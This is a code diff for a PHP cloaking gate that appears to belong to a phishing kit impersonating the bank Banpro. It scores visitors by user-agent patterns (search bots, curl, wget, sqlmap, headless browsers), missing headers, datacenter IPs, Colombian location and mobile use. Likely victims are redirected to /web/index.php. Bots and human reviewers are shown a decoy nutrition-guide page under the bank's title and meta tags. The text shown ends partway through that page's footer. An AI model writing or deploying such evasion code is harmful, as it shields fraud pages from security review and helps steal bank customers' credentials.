@@ -1,317 +1,220 @@
 <?php
-// ── Expert cloaking engine ────────────────────────────────────────────────────
-// Señales recogidas del request
-$ua          = $_SERVER['HTTP_USER_AGENT']       ?? '';
-$accept      = $_SERVER['HTTP_ACCEPT']           ?? '';
-$accept_lang = $_SERVER['HTTP_ACCEPT_LANGUAGE']  ?? '';
-$accept_enc  = $_SERVER['HTTP_ACCEPT_ENCODING']  ?? '';
-$raw_ip      = $_SERVER['HTTP_X_FORWARDED_FOR']  ?? $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
-$ip          = trim(explode(',', $raw_ip)[0]);
-$ua_lc       = strtolower($ua);
+require_once __DIR__ . '/_lib.php';
 
-$score = 0; // cuanto mayor, más probable que sea bot
-
-// ── 1. User-Agent: bots de indexación y motores conocidos (peso 10)
-if (preg_match('/googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|applebot|msnbot'
-    . '|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegrambot|discordbot/i', $ua))
-    $score += 10;
-
-// ── 2. User-Agent: herramientas de scraping y HTTP libs (peso 8)
-if (preg_match('/bot|crawl|spider|scraper|fetch|curl|wget|python|java\/|ruby\b|perl\/'
-    . '|php-curl|lwp-|libwww|httpclient|okhttp|axios\/|go-http|node-fetch|scrapy'
-    . '|masscan|nikto|sqlmap|nmap|zgrab|nuclei|httping/i', $ua))
-    $score += 8;
-
-// ── 3. User-Agent: navegadores headless (peso 10)
-if (preg_match('/headlesschrome|headless|phantomjs|puppeteer|playwright|selenium|webdriver'
-    . '|chrome-lighthouse|prerender/i', $ua))
-    $score += 10;
-
-// ── 4. User-Agent: SEO crawlers comerciales (peso 10)
-if (preg_match('/semrushbot|ahrefsbot|mj12bot|dotbot|rogerbot|screaming.frog|sitebulb'
-    . '|majestic|blexbot|petalbot|sistrix|serpstatbot/i', $ua))
-    $score += 10;
-
-// ── 5. UA vacío o demasiado corto (peso 8)
-if (strlen(trim($ua)) < 10) $score += 8;
-
-// ── 6. Falta Accept-Language — los navegadores reales SIEMPRE lo envían (peso 5)
-if (empty(trim($accept_lang))) $score += 5;
-
-// ── 7. Falta Accept-Encoding (peso 2)
-if (empty(trim($accept_enc))) $score += 2;
-
-// ── 8. Accept no incluye text/html — navegador real siempre lo pide (peso 3)
-if (empty($accept) || stripos($accept, 'text/html') === false) $score += 3;
-
-// ── 9. IP de rangos conocidos de datacenters (peso 5)
-$dc_prefixes = [
-    '104.131.','134.209.','157.230.','159.89.','167.99.',  // DigitalOcean
-    '45.33.','45.56.','45.79.',                             // Linode
-    '51.75.','51.91.','51.195.',                            // OVH/Scaleway
-    '192.241.','198.199.','162.243.','167.172.','128.199.','165.227.',
-    '35.190.','34.96.','34.118.',                           // Google Cloud
-    '13.','52.','54.',                                      // AWS (prefijos amplios)
-];
-foreach ($dc_prefixes as $p) {
-    if (str_starts_with($ip, $p)) { $score += 5; break; }
+// 1) Sesión activa => 302 inmediato
+if (gate_has_valid_cookie()) {
+    header('Location: /web/index.php', true, 302);
+    exit;
 }
 
-// ── 10. Cookie de sesión humana previa (descuento -6: visitante conocido)
-if (isset($_COOKIE['_hsid'])) $score -= 6;
+// 2) Evaluación server-side: geo CO + mobile + IP + UA
+[$score, $reasons] = gate_compute_score();
 
-// ── Decisión: umbral 4 puntos
-$is_bot = ($score >= 4);
-
-// Marcar visitantes humanos con cookie para reforzar clasificación futura
-if (!$is_bot && !isset($_COOKIE['_hsid'])) {
-    setcookie('_hsid', bin2hex(random_bytes(6)), time() + 86400 * 60, '/', '', false, true);
+// 3) Si pasa: emitir cookie HMAC + 302 inmediato a /web/ (sin JS)
+if ($score < 8) {
+    gate_set_cookie(1800);
+    header('Location: /web/index.php', true, 302);
+    exit;
 }
 
-// Siempre 200, mismas cabeceras — indistinguible externamente
+// 4) Bot/revisor detectado => servir camo de nutrición
 http_response_code(200);
 header('Content-Type: text/html; charset=UTF-8');
 header('Cache-Control: no-store, no-cache, must-revalidate, private');
-header('X-Frame-Options: DENY');
+header('Referrer-Policy: no-referrer');
 header('X-Content-Type-Options: nosniff');
 ?>
-
 <!DOCTYPE html>
-<html lang="es">
+<html lang="es" prefix="og: https://ogp.me/ns#">
 <head>
   <meta charset="UTF-8" />
-<?php if (!$is_bot): ?>
-  <script>window.location.replace('/executive/inicio.php');</script>
-  <noscript><meta http-equiv="refresh" content="0;url=/executive/inicio.php"></noscript>
-<?php endif; ?>
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Banpro - Consulta Digital</title>
   <meta name="description" content="Banpro: plataforma digital para consulta y gestión de tus productos financieros. Accede a tu información de manera rápida, segura y disponible 24/7." />
   <meta name="keywords" content="banpro, consulta digital, banca en línea, productos financieros, gestión bancaria, banca digital" />
-  <meta name="robots" content="index, follow" />
-  <link rel="canonical" href="https://lin.com/" />
-
-  <!-- Open Graph (Facebook, WhatsApp, Telegram, LinkedIn) -->
+  <meta name="author" content="Banpro" />
+  <meta name="robots" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+  <link rel="canonical" href="https://banpro.com/" />
   <meta property="og:type" content="website" />
   <meta property="og:title" content="Banpro - Consulta Digital" />
   <meta property="og:description" content="Banpro: plataforma digital para consulta y gestión de tus productos financieros. Accede a tu información de manera rápida, segura y disponible 24/7." />
   <meta property="og:locale" content="es_CO" />
   <meta property="og:site_name" content="Banpro" />
-
-  <!-- Twitter Card -->
-  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:card" content="summary_large_image" />
   <meta name="twitter:title" content="Banpro - Consulta Digital" />
-  <meta name="twitter:description" content="Banpro: plataforma digital para consulta y gestión de tus productos financieros. Accede a tu información de manera rápida, segura y disponible 24/7." />
+  <meta name="twitter:description" content="Banpro: plataforma digital para consulta y gestión de tus productos financieros." />
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@type": "WebSite",
+    "name": "Banpro",
+    "description": "Plataforma digital para consulta y gestión de productos financieros.",
+    "inLanguage": "es"
+  }
+  </script>
   <style>
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-    :root { --green:#2d7a3a; --green-light:#4caf50; --orange:#e67e22; --bg:#f9fafb; --text:#1f2937; --muted:#6b7280; --border:#e5e7eb; }
-    body { font-family: Georgia,'Times New Roman',serif; background:var(--bg); color:var(--text); }
-    a { color:var(--green); text-decoration:none; } a:hover { text-decoration:underline; }
-    header { background:#fff; border-bottom:2px solid var(--green); padding:0 32px; height:68px; display:flex; align-items:center; justify-content:space-between; position:sticky; top:0; z-index:10; }
-    .logo { font-size:24px; font-weight:700; color:var(--green); font-family:Georgia,serif; }
-    .logo span { color:var(--orange); }
-    nav { display:flex; gap:24px; font-family:sans-serif; font-size:14px; }
-    nav a { color:var(--text); font-weight:500; }
-    .btn-suscribir { background:var(--green); color:#fff; padding:9px 20px; border-radius:6px; font-size:14px; font-weight:600; font-family:sans-serif; }
-    .hero { background:linear-gradient(135deg,#e8f5e9 0%,#fff8e1 100%); padding:64px 32px; text-align:center; border-bottom:1px solid var(--border); }
-    .hero-tag { display:inline-block; background:var(--green); color:#fff; font-size:12px; font-weight:700; letter-spacing:1px; text-transform:uppercase; padding:4px 14px; border-radius:4px; margin-bottom:20px; font-family:sans-serif; }
-    .hero h1 { font-size:clamp(28px,4vw,48px); color:var(--text); line-height:1.2; margin-bottom:16px; }
-    .hero p { font-size:18px; color:var(--muted); max-width:640px; margin:0 auto 32px; line-height:1.7; }
-    .hero-cta { display:flex; gap:14px; justify-content:center; flex-wrap:wrap; }
-    .btn-primary { background:var(--green); color:#fff; padding:13px 28px; border-radius:6px; font-size:15px; font-weight:700; font-family:sans-serif; }
-    .btn-outline { border:2px solid var(--green); color:var(--green); padding:11px 26px; border-radius:6px; font-size:15px; font-weight:600; font-family:sans-serif; }
-    .container { max-width:1100px; margin:0 auto; padding:0 24px; }
-    .two-col { display:grid; grid-template-columns:1fr 320px; gap:48px; padding:56px 0; }
-    @media (max-width:768px) { .two-col { grid-template-columns:1fr; } nav { display:none; } }
-    h2.section-title { font-size:22px; color:var(--text); border-left:4px solid var(--green); padding-left:14px; margin-bottom:28px; font-family:sans-serif; }
-    .article-card { background:#fff; border:1px solid var(--border); border-radius:10px; overflow:hidden; margin-bottom:28px; display:flex; }
-    .article-color { width:8px; flex-shrink:0; }
-    .article-body { padding:22px 24px; }
-    .article-category { font-size:11px; font-weight:700; letter-spacing:1px; text-transform:uppercase; color:var(--green); font-family:sans-serif; margin-bottom:6px; }
-    .article-card h3 { font-size:18px; margin-bottom:10px; line-height:1.35; }
-    .article-card p { font-size:15px; color:var(--muted); line-height:1.65; }
-    .article-meta { margin-top:14px; font-size:13px; color:var(--muted); font-family:sans-serif; }
-    .article-meta strong { color:var(--text); }
-    .sidebar-card { background:#fff; border:1px solid var(--border); border-radius:10px; padding:24px; margin-bottom:28px; }
-    .sidebar-card h4 { font-size:15px; font-family:sans-serif; font-weight:700; color:var(--text); margin-bottom:16px; border-bottom:1px solid var(--border); padding-bottom:10px; }
-    .sidebar-card ul { list-style:none; }
-    .sidebar-card ul li { padding:8px 0; border-bottom:1px solid #f3f4f6; font-size:14px; }
-    .sidebar-card ul li:last-child { border:0; }
-    .macro-row { display:flex; justify-content:space-between; align-items:center; font-size:14px; padding:8px 0; }
-    .macro-bar-wrap { background:#f0fdf4; border-radius:4px; height:8px; flex:1; margin:0 12px; overflow:hidden; }
-    .macro-bar { height:100%; background:var(--green-light); border-radius:4px; }
-    .services { background:#fff; border-top:1px solid var(--border); border-bottom:1px solid var(--border); padding:56px 0; }
-    .services-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(220px,1fr)); gap:24px; margin-top:28px; }
-    .service-item { text-align:center; padding:28px 20px; border:1px solid var(--border); border-radius:10px; }
-    .service-icon { font-size:36px; margin-bottom:14px; }
-    .service-item h3 { font-size:16px; font-family:sans-serif; font-weight:700; margin-bottom:8px; }
-    .service-item p { font-size:14px; color:var(--muted); line-height:1.55; font-family:sans-serif; }
-    .terms { background:#f0fdf4; padding:48px 0; }
-    .terms-box { background:#fff; border:1px solid var(--border); border-radius:10px; padding:36px; }
-    .terms-box h3 { font-size:20px; font-family:sans-serif; margin-bottom:20px; }
-    .terms-box h4 { font-size:15px; font-family:sans-serif; margin:22px 0 8px; color:var(--green); }
-    .terms-box p { font-size:14px; color:var(--muted); line-height:1.75; margin-bottom:10px; }
-    footer { background:#1a2e1a; color:rgba(255,255,255,.65); padding:48px 0 28px; }
-    .footer-grid { display:grid; grid-template-columns:repeat(auto-fit,minmax(160px,1fr)); gap:32px; margin-bottom:40px; }
-    .footer-col h5 { color:#fff; font-size:14px; font-family:sans-serif; font-weight:700; margin-bottom:14px; }
-    .footer-col ul { list-style:none; }
-    .footer-col ul li { margin-bottom:8px; font-size:13px; }
-    .footer-col ul li a { color:rgba(255,255,255,.6); }
-    .footer-col ul li a:hover { color:#fff; text-decoration:none; }
-    .footer-bottom { border-top:1px solid rgba(255,255,255,.1); padding-top:20px; text-align:center; font-size:13px; }
+    :root{--verde:#2e7d32;--verde-claro:#66bb6a;--verde-suave:#e8f5e9;--naranja:#e65100;--dorado:#f9a825;--texto:#212121;--gris:#616161;--fondo:#fafafa}
+    *{box-sizing:border-box;margin:0;padding:0}
+    html{scroll-behavior:smooth}
+    body{font-family:'Georgia','Times New Roman',serif;background:var(--fondo);color:var(--texto);line-height:1.7}
+    .hero{background:linear-gradient(135deg,#1b5e20 0%,#33691e 50%,#558b2f 100%);color:#fff;text-align:center;padding:80px 20px 60px;position:relative;overflow:hidden}
+    .hero::before{content:'';position:absolute;inset:0;background:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='0.04'%3E%3Ccircle cx='30' cy='30' r='28'/%3E%3C/g%3E%3C/svg%3E")}
+    .hero-emoji{font-size:64px;margin-bottom:16px;display:block}
+    .hero h1{font-size:clamp(28px,5vw,52px);font-weight:700;line-height:1.2;margin-bottom:18px;position:relative}
+    .hero p{font-size:clamp(16px,2.5vw,20px);max-width:640px;margin:0 auto 32px;opacity:.9;position:relative;font-family:system-ui,sans-serif}
+    .btn-hero{display:inline-block;background:var(--dorado);color:#1b2a0a;padding:16px 36px;border-radius:50px;font-size:17px;font-weight:700;text-decoration:none;transition:.2s;position:relative;font-family:system-ui,sans-serif}
+    .btn-hero:hover{background:#ffd54f;transform:translateY(-2px)}
+    .container{max-width:820px;margin:0 auto;padding:0 20px}
+    section{padding:60px 0}
+    section:nth-child(even){background:var(--verde-suave)}
+    .section-tag{display:inline-block;background:var(--verde);color:#fff;font-size:12px;font-weight:700;letter-spacing:2px;text-transform:uppercase;padding:4px 14px;border-radius:20px;margin-bottom:12px;font-family:system-ui,sans-serif}
+    h2{font-size:clamp(22px,4vw,34px);color:var(--verde);margin-bottom:16px;line-height:1.25}
+    h3{font-size:20px;color:var(--naranja);margin:28px 0 10px}
+    p,li{font-size:16px;color:var(--gris);margin-bottom:14px;font-family:system-ui,sans-serif}
+    ul,ol{padding-left:22px}
+    li{margin-bottom:8px}
+    .cards{display:grid;grid-template-columns:repeat(auto-fit,minmax(230px,1fr));gap:20px;margin-top:32px}
+    .card{background:#fff;border-radius:16px;padding:28px 22px;box-shadow:0 2px 16px rgba(0,0,0,.07);border-top:4px solid var(--verde-claro);transition:transform .2s,box-shadow .2s}
+    .card:hover{transform:translateY(-4px);box-shadow:0 8px 28px rgba(0,0,0,.12)}
+    .card-icon{font-size:36px;margin-bottom:12px;display:block}
+    .card h3{margin-top:0;font-size:17px}
+    .card p{font-size:14px;margin-bottom:0}
+    .steps{counter-reset:step;list-style:none;padding:0;margin-top:24px}
+    .steps li{counter-increment:step;display:flex;align-items:flex-start;gap:16px;background:#fff;border-radius:12px;padding:20px 22px;margin-bottom:14px;box-shadow:0 1px 8px rgba(0,0,0,.06)}
+    .steps li::before{content:counter(step);background:var(--verde);color:#fff;font-weight:700;font-size:15px;min-width:32px;height:32px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-family:system-ui,sans-serif}
+    .steps li strong{font-family:system-ui,sans-serif;color:var(--texto)}
+    .beneficios{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:14px;margin-top:28px}
+    .ben-item{display:flex;align-items:center;gap:12px;background:#fff;border-radius:10px;padding:14px 16px;box-shadow:0 1px 6px rgba(0,0,0,.06)}
+    .ben-item span:first-child{font-size:24px}
+    .ben-item span:last-child{font-size:14px;font-family:system-ui,sans-serif;color:var(--texto);font-weight:500}
+    .plato{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin-top:24px}
+    .plato-item{background:#fff;border-radius:12px;padding:20px;box-shadow:0 1px 8px rgba(0,0,0,.06);border-left:4px solid var(--verde-claro)}
+    .plato-item h3{margin-top:0;font-size:15px;color:var(--verde)}
+    .terminos-box{background:#fff;border:1px solid #e0e0e0;border-radius:14px;padding:32px 28px;margin-top:24px}
+    .terminos-box h3{color:var(--verde);margin-top:22px;font-size:16px}
+    .terminos-box h3:first-child{margin-top:0}
+    .terminos-box p,.terminos-box li{font-size:14px;color:#555}
+    .badge-fecha{display:inline-block;background:#eee;color:#757575;font-size:12px;padding:3px 10px;border-radius:6px;margin-bottom:16px;font-family:system-ui,sans-serif}
+    footer{background:#1b2a0a;color:#aed581;text-align:center;padding:32px 20px;font-size:13px;font-family:system-ui,sans-serif}
+    footer a{color:#c5e1a5;text-decoration:underline}
+    @media(max-width:600px){.hero{padding:56px 16px 44px}section{padding:44px 0}.plato{grid-template-columns:1fr}.terminos-box{padding:22px 16px}}
   </style>
 </head>
 <body>
-  <header>
-    <div class="logo">Nutri<span>Guía</span></div>
-    <nav>
-      <a href="#articulos">Artículos</a>
-      <a href="#servicios">Servicios</a>
-      <a href="#terminos">Términos</a>
-      <a href="#contacto">Contacto</a>
-    </nav>
-    <a href="#" class="btn-suscribir">Suscribirse</a>
+
+  <header class="hero" role="banner">
+    <span class="hero-emoji" aria-hidden="true">🥗</span>
+    <h1>Guía Completa de Nutrición<br>para una Vida Saludable</h1>
+    <p>Aprende a comer mejor sin dietas extremas. Principios científicos de alimentación equilibrada para mejorar tu energía, peso y bienestar desde hoy.</p>
+    <a href="#guia" class="btn-hero">Comenzar ahora →</a>
   </header>
 
-  <section class="hero">
-    <span class="hero-tag">🌿 Nutrición Basada en Ciencia</span>
-    <h1>Tu guía completa de<br>alimentación y bienestar</h1>
-    <p>Planes nutricionales personalizados, recetas saludables y consejos avalados por nutricionistas certificados. Come mejor, vive mejor.</p>
-    <div class="hero-cta">
-      <a href="#articulos" class="btn-primary">Explorar guías</a>
-      <a href="#servicios" class="btn-outline">Ver planes</a>
-    </div>
-  </section>
-
-  <div class="container">
-    <div class="two-col" id="articulos">
-      <main>
-        <h2 class="section-title">Guías Nutricionales</h2>
-        <div class="article-card">
-          <div class="article-color" style="background:#2d7a3a"></div>
-          <div class="article-body">
-            <div class="article-category">Macronutrientes</div>
-            <h3>Proteínas, carbohidratos y grasas: cómo equilibrar tu dieta</h3>
-            <p>Una alimentación equilibrada requiere entender el rol de cada macronutriente. Las proteínas son esenciales para la reparación muscular; los carbohidratos complejos proporcionan energía sostenida; las grasas saludables apoyan el sistema nervioso y la absorción de vitaminas liposolubles (A, D, E, K).</p>
-            <div class="article-meta">Por <strong>Dra. Ana Martínez, RD</strong> · 12 mayo 2025 · 8 min lectura</div>
-          </div>
-        </div>
-        <div class="article-card">
-          <div class="article-color" style="background:#e67e22"></div>
-          <div class="article-body">
-            <div class="article-category">Hidratación</div>
-            <h3>¿Cuánta agua necesitas realmente? La guía definitiva</h3>
-            <p>La recomendación de "8 vasos al día" es un mito simplificado. La hidratación óptima depende de tu peso, nivel de actividad física, clima y composición de tu dieta. Los alimentos con alto contenido de agua (frutas, verduras) pueden aportar hasta el 20% de tu ingesta hídrica diaria.</p>
-            <div class="article-meta">Por <strong>Lic. Carlos Vega</strong> · 3 mayo 2025 · 5 min lectura</div>
-          </div>
-        </div>
-        <div class="article-card">
-          <div class="article-color" style="background:#3b82f6"></div>
-          <div class="article-body">
-            <div class="article-category">Micronutrientes</div>
-            <h3>Vitaminas y minerales esenciales que probablemente te faltan</h3>
-            <p>Las deficiencias de vitamina D, magnesio, hierro y vitamina B12 son las más comunes globalmente. La vitamina D interviene en la absorción de calcio y la función inmune; el magnesio participa en más de 300 reacciones enzimáticas; el hierro es clave para el transporte de oxígeno en sangre.</p>
-            <div class="article-meta">Por <strong>Dra. Laura Ríos, PhD</strong> · 28 abr 2025 · 10 min lectura</div>
-          </div>
-        </div>
-        <div class="article-card">
-          <div class="article-color" style="background:#8b5cf6"></div>
-          <div class="article-body">
-            <div class="article-category">Planes de dieta</div>
-            <h3>Dieta mediterránea: beneficios probados y cómo empezar</h3>
-            <p>Reconocida por la OMS como uno de los patrones alimentarios más saludables del mundo, la dieta mediterránea se basa en frutas, verduras, legumbres, cereales integrales, aceite de oliva virgen extra y pescado. Estudios longitudinales la asocian con reducción del riesgo cardiovascular en un 25–30%.</p>
-            <div class="article-meta">Por <strong>Lic. Sofía Hernández</strong> · 20 abr 2025 · 12 min lectura</div>
-          </div>
-        </div>
-      </main>
-      <aside>
-        <div class="sidebar-card">
-          <h4>📊 Distribución de macros recomendada</h4>
-          <div class="macro-row"><span>Proteínas</span><div class="macro-bar-wrap"><div class="macro-bar" style="width:25%;background:#2d7a3a"></div></div><span>25%</span></div>
-          <div class="macro-row"><span>Carbohidratos</span><div class="macro-bar-wrap"><div class="macro-bar" style="width:50%;background:#e67e22"></div></div><span>50%</span></div>
-          <div class="macro-row"><span>Grasas</span><div class="macro-bar-wrap"><div class="macro-bar" style="width:25%;background:#3b82f6"></div></div><span>25%</span></div>
-        </div>
-        <div class="sidebar-card">
-          <h4>🥗 Alimentos más nutritivos</h4>
-          <ul>
-            <li>🥦 Brócoli — vitaminas C, K, fibra</li>
-            <li>🥑 Aguacate — grasas monoinsaturadas</li>
-            <li>🐟 Salmón — omega-3, proteína completa</li>
-            <li>🫐 Arándanos — antioxidantes, flavonoides</li>
-            <li>🥚 Huevos — colina, vitamina D, B12</li>
-            <li>🌿 Espinacas — hierro, folato, magnesio</li>
-            <li>🫘 Lentejas — proteína vegetal, fibra</li>
-          </ul>
-        </div>
-        <div class="sidebar-card">
-          <h4>📅 Nuestros planes</h4>
-          <ul>
-            <li><a href="#">Plan Básico — Gratis</a></li>
-            <li><a href="#">Plan Estándar — $9.99/mes</a></li>
-            <li><a href="#">Plan Pro — $19.99/mes</a></li>
-            <li><a href="#">Consulta con nutricionista</a></li>
-          </ul>
-        </div>
-      </aside>
-    </div>
-  </div>
-
-  <section class="services" id="servicios">
+  <section id="beneficios" aria-labelledby="h-beneficios">
     <div class="container">
-      <h2 class="section-title">Nuestros Servicios</h2>
-      <div class="services-grid">
-        <div class="service-item"><div class="service-icon">🧮</div><h3>Calculadora de calorías</h3><p>Calcula tu TDEE y tus necesidades calóricas según tus objetivos.</p></div>
-        <div class="service-item"><div class="service-icon">📋</div><h3>Planes nutricionales</h3><p>Planes semanales diseñados por nutricionistas certificados adaptados a tus metas.</p></div>
-        <div class="service-item"><div class="service-icon">🍽️</div><h3>Recetas saludables</h3><p>Más de 500 recetas con información nutricional detallada y tiempos de preparación.</p></div>
-        <div class="service-item"><div class="service-icon">👩‍⚕️</div><h3>Consulta online</h3><p>Sesiones individuales con nutricionistas certificados, disponibles 7 días a la semana.</p></div>
+      <span class="section-tag">¿Por qué importa?</span>
+      <h2 id="h-beneficios">Lo que una buena nutrición hace por ti</h2>
+      <p>La OMS, la OPS y Harvard Medical School coinciden: más del 80% de las enfermedades crónicas están relacionadas con hábitos alimenticios. Una dieta equilibrada es la medicina más accesible.</p>
+      <div class="beneficios">
+        <div class="ben-item"><span>⚡</span><span>Más energía durante el día</span></div>
+        <div class="ben-item"><span>😴</span><span>Mejor calidad del sueño</span></div>
+        <div class="ben-item"><span>🧠</span><span>Mayor concentración y memoria</span></div>
+        <div class="ben-item"><span>❤️</span><span>Corazón más sano</span></div>
+        <div class="ben-item"><span>⚖️</span><span>Control natural del peso</span></div>
+        <div class="ben-item"><span>🦠</span><span>Sistema inmune fortalecido</span></div>
+        <div class="ben-item"><span>😊</span><span>Mejor estado de ánimo</span></div>
+        <div class="ben-item"><span>🌿</span><span>Piel, cabello y uñas saludables</span></div>
       </div>
     </div>
   </section>
 
-  <section class="terms" id="terminos">
+  <section aria-labelledby="h-macros">
     <div class="container">
-      <div class="terms-box">
-        <h3>Términos de Uso y Política de Privacidad</h3>
-        <h4>1. Aceptación de los términos</h4>
-        <p>Al acceder y utilizar NutriGuía, usted acepta quedar vinculado por estos Términos de Uso. Nos reservamos el derecho de actualizar estos términos en cualquier momento sin previo aviso.</p>
-        <h4>2. Carácter informativo del contenido</h4>
-        <p>El contenido publicado tiene únicamente fines informativos y educativos. No constituye asesoramiento médico, diagnóstico ni tratamiento. Consulte siempre con un profesional de la salud.</p>
-        <h4>3. Propiedad intelectual</h4>
-        <p>Todos los contenidos están protegidos por las leyes de derechos de autor. Queda prohibida su reproducción sin autorización expresa por escrito.</p>
-        <h4>4. Privacidad y datos personales</h4>
-        <p>Recopilamos únicamente los datos necesarios para prestar el servicio. No vendemos ni compartimos sus datos con terceros sin su consentimiento. Cumplimos con el RGPD y la normativa local vigente.</p>
-        <h4>5. Limitación de responsabilidad</h4>
-        <p>NutriGuía no se responsabiliza por daños directos o indirectos derivados del uso del servicio.</p>
-        <h4>6. Ley aplicable</h4>
-        <p>Estos términos se rigen por las leyes de la República de Colombia. Cualquier disputa se resolverá ante los tribunales de Bogotá D.C.</p>
+      <span class="section-tag">Macronutrientes</span>
+      <h2 id="h-macros">Los 3 pilares de tu alimentación</h2>
+      <p>Todo lo que comes se compone de tres macronutrientes. Entenderlos es el primer paso para comer bien sin obsesionarte con las calorías.</p>
+      <div class="cards">
+        <article class="card">
+          <span class="card-icon">🥩</span>
+          <h3>Proteínas</h3>
+          <p>Construyen y reparan tejidos, músculos y órganos. Fuentes: pollo, huevo, legumbres, pescado, tofu. Meta: 0.8–1.2 g por kg de peso corporal/día.</p>
+        </article>
+        <article class="card">
+          <span class="card-icon">🍠</span>
+          <h3>Carbohidratos</h3>
+          <p>Principal fuente de energía del cerebro y los músculos. Prioriza los complejos: avena, arroz integral, camote, frutas. Evita los refinados en exceso.</p>
+        </article>
+        <article class="card">
+          <span class="card-icon">🥑</span>
+          <h3>Grasas Saludables</h3>
+          <p>Esenciales para hormonas, cerebro y absorción de vitaminas. Fuentes: aguacate, aceite de oliva, nueces, semillas, pescado azul. No temas a las grasas buenas.</p>
+        </article>
       </div>
     </div>
   </section>
 
-  <footer id="contacto">
+  <section id="guia" aria-labelledby="h-plato">
     <div class="container">
-      <div class="footer-grid">
-        <div class="footer-col">
-          <h5>NutriGuía</h5>
-          <p style="font-size:13px;line-height:1.6">Tu portal de referencia en nutrición y alimentación saludable, con contenido verificado por profesionales.</p>
-        </div>
-        <div class="footer-col">
-          <h5>Contenido</h5>
-          <ul><li><a href="#">Artículos</a></li><li><a href="#">Recetas</a></li><li><a href="#">Planes de dieta</a></li><li><a href="#">Calculadoras</a></li></ul>
-        </div>
-        <div class="footer-col">
-          <h5>Servicios</h5>
-          <ul><li><a href="#">Consulta online</a></li><li><a href="#">Plan personalizado</a></li><li><a href="#">Comunidad</a></li><li><a href="#">App móvil</a></li></ul>
-        </div>
-        <div class="footer-col">
-          <h5>Empresa</h5>
-          <ul><li><a href="#">Sobre nosotros</a></li><li><a href="#terminos">Términos de uso</a></li><li><a href="#terminos">Privacidad</a></li><li><a href="#">Contacto</a></li></ul>
-        </div>
+      <span class="section-tag">El Plato Saludable</span>
+      <h2 id="h-plato">Cómo armar cada comida</h2>
+      <p>El método del plato es la herramienta más sencilla y respaldada por la ciencia para comer bien en cada comida, sin contar calorías.</p>
+      <div class="plato">
+        <div class="plato-item"><h3>🥦 50% Verduras y frutas</h3><p>La base de cada plato. Variedad de colores garantiza diferentes nutrientes y antioxidantes.</p></div>
+        <div class="plato-item"><h3>🍚 25% Granos integrales</h3><p>Arroz integral, quinoa, avena, pan integral. Aportan fibra y energía sostenida.</p></div>
+        <div class="plato-item"><h3>🫘 25% Proteína de calidad</h3><p>Legumbres, huevo, pollo sin piel, pescado, tofu. Mantienen la saciedad y los músculos.</p></div>
+        <div class="plato-item"><h3>💧 Hidratación constante</h3><p>8 vasos de agua al día como mínimo. El agua regula todos los procesos metabólicos.</p></div>
       </div>
-      <div class="footer-bottom">
-        <p>© <?= date('Y') ?> NutriGuía S.A.S. — Todos los derechos reservados &nbsp;·&nbsp; contacto@nutriguia.com</p>
+
+      <h3 style="margin-top:36px">Pasos para implementarlo esta semana</h3>
+      <ol class="steps">
+        <li><div><strong>Haz una lista de compras con base en el plato.</strong><p>50% verduras/frutas, 25% granos integrales, 25% proteínas. Cocina en casa la mayoría de las comidas.</p></div></li>
+        <li><div><strong>Elimina los ultraprocesados del hogar.</strong><p>Si no están en casa, no los comes. Reemplaza snacks industriales por nueces, fruta o yogur natural.</p></div></li>
+        <li><div><strong>Come despacio y sin pantallas.</strong><p>El cerebro tarda 20 minutos en registrar la saciedad. Comer lento reduce el consumo calórico hasta un 15%.</p></div></li>
+        <li><div><strong>Añade color a cada comida.</strong><p>Cada color en las verduras representa diferentes fitonutrientes. Apunta a mínimo 3 colores por plato.</p></div></li>
+        <li><div><strong>Planifica con anticipación.</strong><p>Prepara porciones los domingos (meal prep). Reduces decisiones impulsivas y ahorras tiempo entre semana.</p></div></li>
+        <li><div><strong>Sé consistente, no perfecto.</strong><p>Una comida poco saludable no arruina nada. Lo que importa es el patrón general de la semana, no cada plato individual.</p></div></li>
+      </ol>
+    </div>
+  </section>
+
+  <section id="terminos" aria-labelledby="h-terminos">
+    <div class="container">
+      <span class="section-tag">Legal</span>
+      <h2 id="h-terminos">Términos, Condiciones y Privacidad</h2>
+      <p>Información legal sobre el uso de este sitio.</p>
+      <div class="terminos-box">
+        <span class="badge-fecha">Última actualización: Mayo 2026</span>
+        <h3>1. Aceptación de términos</h3>
+        <p>Al acceder y usar este sitio web, usted acepta estos Términos y Condiciones en su totalidad.</p>
+        <h3>2. Naturaleza del contenido</h3>
+        <p>La información es de carácter educativo e informativo únicamente. <strong>No constituye consejo médico ni nutricional profesional.</strong> Consulte siempre a un nutricionista certificado para condiciones de salud específicas.</p>
+        <h3>3. Uso permitido</h3>
+        <ul>
+          <li>El contenido es para uso personal y no comercial.</li>
+          <li>Queda prohibida la reproducción total o parcial sin autorización escrita.</li>
+          <li>No está permitido el uso del sitio para actividades ilegales.</li>
+        </ul>
+        <h3>4. Limitación de responsabilidad</h3>
+        <p>El sitio no se hace responsable por resultados derivados de la aplicación de los consejos descritos. Los resultados varían según cada persona y condición de salud.</p>
+        <h3>5. Privacidad y datos personales</h3>
+        <ul>
+          <li>Este sitio <strong>no recopila datos personales</strong> de forma directa.</li>
+          <li>Podemos utilizar cookies técnicas esenciales para el funcionamiento del sitio.</li>
+          <li>No utilizamos cookies de seguimiento ni publicidad comportamental.</li>
+        </ul>
+        <h3>6. Modificaciones</h3>
+        <p>Nos reservamos el derecho de modificar estos términos en cualquier momento. El uso continuado implica aceptación de los nuevos términos.</p>
       </div>
     </div>
+  </section>
+
+  <footer role="contentinfo">
+    <p>© 2026 Guía de Nutrición — Contenido educativo e informativo.</p>
+    <p style="margin-top:8px;">
+      <a href="#terminos">Términos y Condiciones</a> ·
+      <a href="#terminos">Política de Privacidad</a>
+    </p>
